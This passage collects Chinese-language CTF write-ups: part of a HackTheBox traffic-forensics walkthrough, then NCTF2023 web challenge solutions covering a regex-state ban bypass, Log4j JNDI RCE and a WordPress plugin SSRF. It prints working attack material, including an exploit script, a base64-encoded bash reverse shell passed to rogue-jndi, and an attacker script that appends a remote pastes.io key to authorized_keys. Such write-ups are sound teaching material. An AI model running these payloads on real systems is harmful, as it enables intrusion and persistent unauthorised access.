<p><img src="/article/Meerkat-HackTheBox/image-20240418111600611.png"></p>
<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>攻击者利用哪个字符串附加到 API URL 路径来绕过授权过滤器？</strong></p>
<p>我们往下找，注意到<code>/bonita/API/portal/page/;i18ntranslation</code>路径的请求，并且后面就直接RCE了，说明<code>i18ntranslation</code>字符大概率是绕过waf。</p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418111822445.png"></p>
<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>撞库攻击中使用了多少种用户名和密码组合？</strong></p>
<p>查看访问<code>/bonita/loginservice</code>总共多少个包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Meerkat-HackTheBox/image-20240418195919731.png"></p>
<p>但是发现很多个包username和password均为install，这些我们不用算在里面所以排除一下</p>
<p>（当然也可以url解码username会发现为邮箱格式）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot; &amp;&amp; !http contains &quot;install&quot;</span><br></pre></td></tr></table></figure>

<p>右下角显示59个，因为可能存在重复密码所以要查看下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot; &amp;&amp; !http contains &quot;install&quot; &amp;&amp; http contains &quot;seb.broom%40forela.co.uk&quot;</span><br></pre></td></tr></table></figure>

<p>找到用户名<code>seb.broom%40forela.co.uk</code>存在四次重复密码</p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418200345629.png"></p>
<p>整理一下<code>59-4+1</code>总共56次碰撞</p>
<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>哪个用户名和密码组合成功？</strong></p>
<p>我们查找一下响应包也就是用到<code>ip.src</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==172.31.6.44</span><br></pre></td></tr></table></figure>

<p>注意到响应为204说明爆破成功，追踪下tcp</p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418200905116.png"></p>
<p>得到用户名和密码（答案注意url编码）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=seb.broom%40forela.co.uk&amp;password=g0vernm3nt</span><br></pre></td></tr></table></figure>

<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>如果有，攻击者使用了哪个文本共享网站？</strong></p>
<p>使用网站的话那么请求包中应该有<code>http</code>字符（也可以筛选字符串<code>cmd</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;http&quot; &amp;&amp; http</span><br></pre></td></tr></table></figure>

<p>找到为<code>pastes.io</code></p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418201250245.png"></p>
<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>请提供攻击者用于在我们的主机上获得持久性的公钥的文件名。</strong></p>
<p>我们已经知道黑客用wget去下载该文件，我们打开kali去下载看看</p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418202654452.png"></p>
<p>不给连接这就怪了，文件内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys</span><br><span class="line">sudo service ssh restart</span><br></pre></td></tr></table></figure>

<p>所以文件名为<code>hffgra4unv</code></p>
<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>您能否确认攻击者修改的文件以获得持久性？</strong></p>
<p>通过前一道题可以知道用curl命令将文件写到<code>/home/ubuntu/.ssh/authorized_keys</code></p>
<p>所以能知道攻击者修改了文件</p>
<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>您能确认这种持久性机制的 MITRE 技术 ID 吗？</strong></p>
<p>搜索引擎搜索<code>MITRE authorized_keys</code> ，成功找到id为<code>T1098.004</code></p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418203318734.png"></p>
]]></content>
      <categories>
        <category>流量分析</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF2023</title>
    <url>/article/NCTF2023.html</url>
    <content><![CDATA[<p>质量很高的比赛，收获满满</p>
<span id="more"></span>

<h1 id="NCTF-2023-web解析"><a href="#NCTF-2023-web解析" class="headerlink" title="[NCTF 2023]web解析"></a>[NCTF 2023]web解析</h1><h2 id="WaitWhat"><a href="#WaitWhat" class="headerlink" title="WaitWhat?"></a>WaitWhat?</h2><p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const child_process = require(&#x27;child_process&#x27;)</span><br><span class="line">const app = express()</span><br><span class="line">app.use(express.json())</span><br><span class="line">const port = 80</span><br><span class="line"></span><br><span class="line">function escapeRegExp(string) &#123;</span><br><span class="line">    return string.replace(/[.*+?^$&#123;&#125;()|[\]\\]/g, &#x27;\\$&amp;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let users = &#123;</span><br><span class="line">    &quot;admin&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;user&quot;: &quot;user&quot;,</span><br><span class="line">    &quot;guest&quot;: &quot;guest&quot;,</span><br><span class="line">    &#x27;hacker&#x27;:&#x27;hacker&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let banned_users = [&#x27;hacker&#x27;]</span><br><span class="line"></span><br><span class="line">// 你不准getflag</span><br><span class="line">banned_users.push(&quot;admin&quot;)</span><br><span class="line"></span><br><span class="line">let banned_users_regex = null;</span><br><span class="line">function build_banned_users_regex() &#123;</span><br><span class="line">	let regex_string = &quot;&quot;</span><br><span class="line">    for (let username of banned_users) &#123;</span><br><span class="line">        regex_string += &quot;^&quot; + escapeRegExp(username) + &quot;$&quot; + &quot;|&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.substring(0, regex_string.length - 1)</span><br><span class="line">    banned_users_regex = new RegExp(regex_string, &quot;g&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//鉴权中间件</span><br><span class="line">function requireLogin(req, res, next) &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    let password = req.body.password</span><br><span class="line">    if (!username || !password) &#123;</span><br><span class="line">        res.send(&quot;用户名或密码不能为空&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if (typeof username !== &quot;string&quot; || typeof password !== &quot;string&quot;) &#123;</span><br><span class="line">        res.send(&quot;用户名或密码不合法&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    // 基于正则技术的封禁用户匹配系统的设计与实现</span><br><span class="line">    let test1 = banned_users_regex.test(username)</span><br><span class="line">    console.log(`使用正则$&#123;banned_users_regex&#125;匹配$&#123;username&#125;的结果为：$&#123;test1&#125;`)</span><br><span class="line">    if (test1) &#123;</span><br><span class="line">		console.log(&quot;第一个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">        res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    // 基于in关键字的封禁用户匹配系统的设计与实现</span><br><span class="line">    let test2 = (username in banned_users)</span><br><span class="line">    console.log(`使用in关键字匹配$&#123;username&#125;的结果为：$&#123;test2&#125;`)</span><br><span class="line">    if (test2)&#123;</span><br><span class="line">        console.log(&quot;第二个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">        res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if (username in users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        next()</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    res.send(&quot;用户名或密码错误，鉴权失败！&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function registerUser(username, password) &#123;</span><br><span class="line">    if (typeof username !== &quot;string&quot; || username.length &gt; 20) &#123;</span><br><span class="line">        return &quot;用户名不合法&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if (typeof password !== &quot;string&quot; || password.length &gt; 20) &#123;</span><br><span class="line">        return &quot;密码不合法&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if (username in users) &#123;</span><br><span class="line">        return &quot;用户已存在&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(let existing_user in users)&#123;</span><br><span class="line">        let existing_user_password = users[existing_user]</span><br><span class="line">        if (existing_user_password === password)&#123;</span><br><span class="line">            return `您的密码已经被用户&#x27;$&#123;existing_user&#125;&#x27;使用了，请使用其它的密码`</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users[username] = password</span><br><span class="line">    return &quot;注册成功&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(express.static(&#x27;public&#x27;))</span><br><span class="line"></span><br><span class="line">// 每次请求前，更新封禁用户正则信息</span><br><span class="line">app.use(function (req, res, next) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        build_banned_users_regex()</span><br><span class="line">		console.log(&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;,banned_users_regex)</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&quot;/api/register&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    let password = req.body.password</span><br><span class="line">    let message = registerUser(username, password)</span><br><span class="line">    res.send(message)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&quot;/api/login&quot;, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    res.send(&quot;登录成功！&quot;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&quot;/api/flag&quot;, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    if (username !== &quot;admin&quot;) &#123;</span><br><span class="line">        res.send(&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot; + username + &quot;&#x27;&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    let flag = child_process.execSync(&quot;cat flag&quot;).toString()</span><br><span class="line">    res.end(flag)</span><br><span class="line">    console.error(&quot;有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！&quot;)</span><br><span class="line">    res.on(&quot;finish&quot;, () =&gt; &#123;</span><br><span class="line">        setTimeout(() =&gt; &#123; process.exit(0) &#125;, 1)</span><br><span class="line">    &#125;)</span><br><span class="line">    return</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/api/ban_user&#x27;, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    let ban_username = req.body.ban_username</span><br><span class="line">    if(!ban_username)&#123;</span><br><span class="line">        res.send(&quot;ban_username不能为空&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if(username === ban_username)&#123;</span><br><span class="line">        res.send(&quot;不能封禁自己&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    for (let name of banned_users)&#123;</span><br><span class="line">        if (name === ban_username) &#123;</span><br><span class="line">            res.send(&quot;用户已经被封禁&quot;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    banned_users.push(ban_username)</span><br><span class="line">    res.send(&quot;封禁成功！&quot;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    res.redirect(&quot;/static/index.html&quot;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`listening on port $&#123;port&#125;`)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>代码很长我们分析一下：</p>
<p>首先定义escapeRegExp函数去进行转义，给了user数组包含四个用户和对应密码，然后定义banned_users数组并随后通过push添加admin用户为黑名单</p>
<p>然后看向build_banned_users_regex()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let banned_users_regex = null;</span><br><span class="line">function build_banned_users_regex() &#123;</span><br><span class="line">	let regex_string = &quot;&quot;</span><br><span class="line">    for (let username of banned_users) &#123;</span><br><span class="line">        regex_string += &quot;^&quot; + escapeRegExp(username) + &quot;$&quot; + &quot;|&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.substring(0, regex_string.length - 1)</span><br><span class="line">    banned_users_regex = new RegExp(regex_string, &quot;g&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对传入的username进行正则匹配，然后截断也就是<code>/^admin$/</code>，最后启用了参数g</p>
<p>和它有关的是<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastIndex">lastIndex</a>属性</p>
<p><strong>RegExp.lastIndex</strong></p>
<blockquote>
<p><code>lastIndex</code> 是正则表达式的一个可读可写的整型属性，用来指定下一次匹配的起始索引。</p>
</blockquote>
<p>只有正则表达式使用了表示全局检索的 “<code>g</code>“ 或者粘性检索的 “<code>y</code>“ 标志时，该属性才会起作用。此时应用下面的规则：</p>
<ul>
<li>如果 <code>lastIndex</code> 大于字符串的长度，则 <code>regexp.test</code> 和 <code>regexp.exec</code> 将会匹配失败，然后 <code>lastIndex</code> 被设置为 0。</li>
<li>如果 <code>lastIndex</code> 等于或小于字符串的长度，则该正则表达式匹配从 <code>lastIndex</code> 位置开始的字符串。    <ul>
<li>如果 <code>regexp.test</code> 和 <code>regexp.exec</code> 匹配成功，<code>lastIndex</code> 会被设置为紧随最近一次成功匹配的下一个位置。</li>
<li>如果 <code>regexp.test</code> 和 <code>regexp.exec</code> 匹配失败，<code>lastIndex</code> 会被设置为 0</li>
</ul>
</li>
</ul>
<p>我们本地测试下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var re = /^admin$/g;</span><br><span class="line">console.log(re.test(&#x27;admin&#x27;))</span><br><span class="line">console.log(&quot;第一次：&quot;+re.lastIndex)</span><br><span class="line">console.log(re.test(&#x27;admin&#x27;))</span><br><span class="line">console.log(&quot;第二次：&quot;+re.lastIndex)</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="/article/NCTF2023/image-20240401201000544.png"></p>
<p>不难发现如果正则表达式设置了全局标志， test() 的执行会改变正则表达式 lastIndex 属性。连续的执行 test() 方法，后续的执行将会从lastIndex处开始匹配字符串</p>
<p>我们继续往下看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//鉴权中间件</span><br><span class="line">function requireLogin(req, res, next) &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    let password = req.body.password</span><br><span class="line">    if (!username || !password) &#123;</span><br><span class="line">        res.send(&quot;用户名或密码不能为空&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if (typeof username !== &quot;string&quot; || typeof password !== &quot;string&quot;) &#123;</span><br><span class="line">        res.send(&quot;用户名或密码不合法&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    // 基于正则技术的封禁用户匹配系统的设计与实现</span><br><span class="line">    let test1 = banned_users_regex.test(username)</span><br><span class="line">    console.log(`使用正则$&#123;banned_users_regex&#125;匹配$&#123;username&#125;的结果为：$&#123;test1&#125;`)</span><br><span class="line">    if (test1) &#123;</span><br><span class="line">		console.log(&quot;第一个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">        res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    // 基于in关键字的封禁用户匹配系统的设计与实现</span><br><span class="line">    let test2 = (username in banned_users)</span><br><span class="line">    console.log(`使用in关键字匹配$&#123;username&#125;的结果为：$&#123;test2&#125;`)</span><br><span class="line">    if (test2)&#123;</span><br><span class="line">        console.log(&quot;第二个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">        res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if (username in users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        next()</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    res.send(&quot;用户名或密码错误，鉴权失败！&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>requireLogin()函数起到了鉴权作用，设置了两套waf，分别是正则技术和in关键字，要想登陆成功就必须绕过waf。</p>
<p>第一个我们前文已经知道banned_users_regex()函数的具体执行过程，test()返回一个布尔值，由于我们刚刚测试过设置了全局标志，连续的执行 test() 方法会使其布尔值发生改变，我们往下看在app.use处发现会更新封禁用户正则信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 每次请求前，更新封禁用户正则信息</span><br><span class="line">app.use(function (req, res, next) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        build_banned_users_regex()</span><br><span class="line">		console.log(&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;,banned_users_regex)</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>我们要让其不更新正则信息利用test()多次执行返回false的布尔值绕过第一个waf，也就是说我们要抛出异常。</p>
<p>我们注意到banned_users_regex()函数中escapeRegExp()定义的是接收string类型的，如果传递非字符串类型就可以实现抛出TypeError</p>
<p>第二个waf根据注释是基于<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in">in关键字</a>我们来分析一下</p>
<blockquote>
<p>如果指定的属性在指定的对象或其原型链中，则 <strong><code>in</code></strong> <strong>运算符</strong>返回 <code>true</code>。</p>
</blockquote>
<p>我们本地测试下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const list = &#123;id:&#x27;1&#x27;,grade:&#x27;100&#x27;,name:&#x27;rev1ve&#x27;&#125;</span><br><span class="line">console.log(list)</span><br><span class="line">if(&#x27;name&#x27; in list === true)&#123;</span><br><span class="line">    console.log(&#x27;name is in list!&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果<br><img src="/article/NCTF2023/image-20240401201015290.png"></p>
<p>说明指定的是属性，那如果是数组呢，给个示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const banned_users = [&#x27;hacker&#x27;,&#x27;admin&#x27;]</span><br><span class="line">username=&#x27;admin&#x27;</span><br><span class="line">let test1 = (username in banned_users)</span><br><span class="line">if(test1)&#123;</span><br><span class="line">    console.log(&#x27;waffff&#x27;)</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    console.log(&#x27;success!&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于没有admin属性，所以test1布尔值返回为false，也就是说这是假的waf（hhh）</p>
<p>接着往下看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function registerUser(username, password) &#123;</span><br><span class="line">    if (typeof username !== &quot;string&quot; || username.length &gt; 20) &#123;</span><br><span class="line">        return &quot;用户名不合法&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if (typeof password !== &quot;string&quot; || password.length &gt; 20) &#123;</span><br><span class="line">        return &quot;密码不合法&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if (username in users) &#123;</span><br><span class="line">        return &quot;用户已存在&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(let existing_user in users)&#123;</span><br><span class="line">        let existing_user_password = users[existing_user]</span><br><span class="line">        if (existing_user_password === password)&#123;</span><br><span class="line">            return `您的密码已经被用户&#x27;$&#123;existing_user&#125;&#x27;使用了，请使用其它的密码`</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users[username] = password</span><br><span class="line">    return &quot;注册成功&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>registerUser函数就是检查用户名和密码是否合法</p>
<p>然后就是<code>/api/register</code>路由和有鉴权过程的<code>/api/login</code>路由没有什么信息，<code>/api/flag</code>路由要想得到flag就得绕过waf，以admin身份登录即可，<code>/api/ban_user</code>路由实现抛出异常</p>
<p>整理一下思路：首先随便注册一个用户test，然后访问<code>/api/ban_user</code>路由传数组格式抛出异常绕过regex的更新，然后进行第一次访问<code>/api/flag</code>路由正则匹配成功，waf成功拦截，接着第二次访问<code>/api/flag</code>路由，正则匹配失败，成功绕过waf得到flag</p>
<p>脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">req=requests.Session()</span><br><span class="line">url=&#x27;http://117.50.175.234:9001/&#x27;</span><br><span class="line"></span><br><span class="line">req1=req.post(url+&quot;api/register&quot;,json=&#123;&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;&#125;)</span><br><span class="line">print(req1.text)</span><br><span class="line"></span><br><span class="line">req2=req.post(url+&quot;api/ban_user&quot;,json=&#123;&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;,&quot;ban_username&quot;:&#123;&quot;error&quot;:&quot;&quot;&#125;&#125;)</span><br><span class="line">print(req2.text)</span><br><span class="line"></span><br><span class="line">req3=req.post(url+&quot;api/flag&quot;,json=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;)</span><br><span class="line">print(req3.text)</span><br><span class="line"></span><br><span class="line">req4=req.post(url+&quot;api/flag&quot;,json=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;)</span><br><span class="line">print(req4.text)</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="/article/NCTF2023/image-20240401201030505.png"></p>
<h2 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h2><blockquote>
<p>考点：log4j rce (CVE-2021-44228)</p>
</blockquote>
<p>我们将题目给的jar文件反编译一下，找到pom.xml文件<br><img src="/article/NCTF2023/image-20240401201126614.png"><br>可以知道是springboot框架，结合提示是log4j的远程RCE<br>目标就是找到注入点触发log4j的漏洞</p>
<p><strong>参考wp</strong></p>
<blockquote>
<p>如何实现SpringBoot在默认配置下如何触发Log4j2 JNDI RCE（默认配置是指代码仅仅使用了Log4j2的依赖）<br>核心思路就是：构造⼀个畸形的HTTP数据包使得SpringBoot控制台报错</p>
</blockquote>
<p>本题利用的是http请求的Accept头，接下来就是JNDI常规注入<br>使用工具<code>rogue-jndi</code>，由于之前做的log4j漏洞是htb能出网的机子(参考文章)，所以本题需要修改下参数值<br>映射端口如下<br><img src="/article/NCTF2023/image-20240401201220929.png"><br>运行工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar target/RogueJndi-1.1.jar --command &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC81aTc4MTk2M3AyLnlpY3AuZnVuLzU4MjY1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; --hostname &quot;192.168.132.128&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/article/NCTF2023/image-20240401201235782.png"></p>
<p>选择第三个，抓包在Accept头添加payload<br>然后修改一下ip地址（因为是内网穿透）</p>
<p><img src="/article/NCTF2023/image-20240401201246801.png"></p>
<p>成功反弹shell得到flag</p>
<p><img src="/article/NCTF2023/image-20240401201329986.png"></p>
<h2 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h2><p>打开题目，没什么收获看看hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hint 1: 可以思考下如何对 WordPress 进行信息收集</span><br><span class="line"></span><br><span class="line">Hint 2: 注意版本 (6.4.1) 注意一些第三方的东西</span><br><span class="line"></span><br><span class="line">Hint 3: 结合信息收集和网上已有的东西就可以自己本地搭建一个类似的环境进行测试 涉及的代码审计部分其实很少</span><br><span class="line"></span><br><span class="line">Hint 4: https://wwnt.lanzout.com/iwUdK1ir03te</span><br><span class="line"></span><br><span class="line">Hint 5: upload phar + file read (ssrf) =&gt; rce</span><br><span class="line"></span><br><span class="line">Hint 6: 请不要使用 burp 的 Paste from file 功能 (存在 bug) 建议手动构造 upload.html 然后浏览器选择文件抓取上传包 或者写 python 脚本上传 或者使用 yakit </span><br></pre></td></tr></table></figure>

<p>hint1应该是能通过wpscan扫出来有用的线索，刚好hint4是给的扫描结果；然后hint2说注意版本以及第三方东西，应该就是插件</p>
<p>那么我们看一下扫描结果</p>
<p><img src="/article/NCTF2023/image-20231229143529891.png"></p>
<p>果然是扫出来几个插件，重点看向all-in-one-video-gallery和drag-and-drop-multiple-file-upload-contact-form-7以及对应的版本</p>
<p>我们根据关键词搜出来all-in-one-video-gallery插件具有ssrf和文件读取漏洞并且知道对应cve漏洞编号</p>
<p><img src="/article/NCTF2023/image-20231229140607931.png"></p>
<p>在网上找到篇文章如何构造ssrf漏洞 <a href="https://blog.amanrawat.in/2022/09/28/CVE-2022-2633.html">参考链接</a></p>
<p>在<code>/index.php/video</code>路由下存在dl参数，如果不为数字则对其base64解码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function download_video() &#123;</span><br><span class="line">if ( ! isset( $_GET[&#x27;dl&#x27;] ) ) &#123;</span><br><span class="line">	return;</span><br><span class="line">&#125;	</span><br><span class="line">		</span><br><span class="line">if ( is_numeric( $_GET[&#x27;dl&#x27;] ) ) &#123;</span><br><span class="line">	$file = get_post_meta( (int) $_GET[&#x27;dl&#x27;], &#x27;mp4&#x27;, true );</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$file = base64_decode( $_GET[&#x27;dl&#x27;] );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( empty( $file ) ) &#123;</span><br><span class="line">	die( esc_html__( &#x27;Download file URL is empty.&#x27;, &#x27;all-in-one-video-gallery&#x27; ) );</span><br><span class="line">	exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来文章就是讲解如何触发ssrf漏洞（本文不做叙述）</p>
<p>看向下面的<strong>利用未经身份验证的任意文件下载</strong></p>
<p>利用代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( $is_remote_file &amp;&amp; $formatted_path == &#x27;url&#x27; ) &#123;         </span><br><span class="line">	$data = @get_headers( $file, true );</span><br><span class="line">          </span><br><span class="line">	if ( ! empty( $data[&#x27;Content-Length&#x27;] ) ) &#123;</span><br><span class="line">		$file_size = (int) $data[ &#x27;Content-Length&#x27; ];          </span><br><span class="line">		&#125; else &#123;               </span><br><span class="line">			// If get_headers fails then try to fetch fileSize with curl</span><br><span class="line">			$ch = @curl_init();</span><br><span class="line">			if ( ! @curl_setopt( $ch, CURLOPT_URL, $file ) ) &#123;</span><br><span class="line">            	@curl_close( $ch );</span><br><span class="line">            	@exit;</span><br><span class="line">        	&#125;</span><br><span class="line">               </span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_NOBODY, true );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_HEADER, true );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_MAXREDIRS, 3 );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 10 );</span><br><span class="line">        	@curl_exec( $ch );</span><br><span class="line">               </span><br><span class="line">			if ( ! @curl_errno( $ch ) ) &#123;</span><br><span class="line">				$http_status = (int) @curl_getinfo( $ch, CURLINFO_HTTP_CODE );</span><br><span class="line">				if ( $http_status &gt;= 200 &amp;&amp; $http_status &lt;= 300 )&#123;</span><br><span class="line">					$file_size = (int) @curl_getinfo( $ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD );</span><br><span class="line">				&#125;</span><br><span class="line">				@curl_close( $ch );</span><br><span class="line">        	&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;else&#123;	</span><br><span class="line">	$chunk = 1 * ( 1024 * 1024 );</span><br><span class="line">	$nfile = @fopen( $file, &#x27;rb&#x27; );</span><br><span class="line">	while ( ! feof( $nfile ) ) &#123;                 </span><br><span class="line">		print( @fread( $nfile, $chunk ) );</span><br><span class="line">    	@ob_flush();</span><br><span class="line">    	@flush();</span><br><span class="line">&#125;</span><br><span class="line">@fclose( $filen );</span><br></pre></td></tr></table></figure>

<p>如果<code>is_remote_file</code>为真，<code>formatted_path</code>等于url，那么将使用 cURL 库发出请求，否则如果将使用“fopen”函数来读取文件。</p>
